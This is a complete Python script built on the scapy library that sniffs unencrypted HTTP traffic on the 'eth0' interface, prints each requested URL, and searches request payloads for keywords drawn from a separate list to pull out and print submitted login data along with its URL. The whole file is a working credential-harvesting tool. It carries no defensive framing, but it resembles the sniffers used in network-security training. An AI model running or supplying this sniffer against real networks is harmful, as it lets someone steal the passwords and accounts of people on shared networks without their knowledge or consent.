import scapy.all as scapy
from scapy.layers import http
from keywords import keywords

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
    return url

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        for keyword in keywords:
            load = packet[scapy.Raw].load.decode(errors='ignore')  # Decode the load for better readability
            if keyword in load:
                host = packet[http.HTTPRequest].Host.decode()
                path = packet[http.HTTPRequest].Path.decode()
                url = f"http://{host}{path}"
                return_data = f"\n\nKeyword found: {keyword}\nData: {load}\nURL: {url}\n\n\n"
                return return_data

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        login_info = get_login(packet)
        if login_info:
            print(login_info)

sniff("eth0")
